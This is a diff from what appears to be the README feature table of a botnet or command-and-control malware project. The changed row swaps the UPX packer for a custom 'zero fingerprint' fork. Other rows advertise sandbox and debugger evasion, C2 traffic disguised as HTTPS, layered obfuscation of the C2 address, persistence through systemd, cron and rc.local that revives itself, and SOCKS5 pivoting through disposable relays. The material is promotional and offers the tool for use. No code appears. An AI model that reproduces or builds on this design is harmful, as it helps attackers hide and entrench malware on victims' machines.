@@ -29,7 +29,7 @@
 | **Automated Setup** | Python wizard handles config, compilation, and deployment. Run once, done. |
 | **Encrypted Transport** | TLS 1.3 bot↔C2 over port 443. Indistinguishable from normal HTTPS. |
 | **Anti-Analysis** | 40+ VM/sandbox/debugger signatures. Parent process detection. Sandboxes never reach `main()`. |
-| **Stealth Driven** | All strings AES-128-CTR encrypted at build time (per-build random key). C2 address decoded through a 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Bundled UPX packer with signature stripping obfuscates every binary. |
+| **Stealth Driven** | All strings AES-128-CTR encrypted at build time (per-build random key). C2 address decoded through a 6-layer pipeline: AES → Base64 → XOR → RC4 → byte-sub → MD5 check. Bundled m30w packer (custom UPX fork, zero fingerprint) obfuscates every binary. |
 | **HMAC Registration** | MD5 challenge-response with per-campaign sync tokens. Replay-proof. |
 | **Triple Persistence** | Systemd + cron watchdog + rc.local. Kill one, the others revive it. |
 | **SOCKS5 Pivoting** | Backconnect relay (primary) or direct listener. Multi-relay failover with auto-reconnect. Disposable relay VPS keeps C2 hidden. |
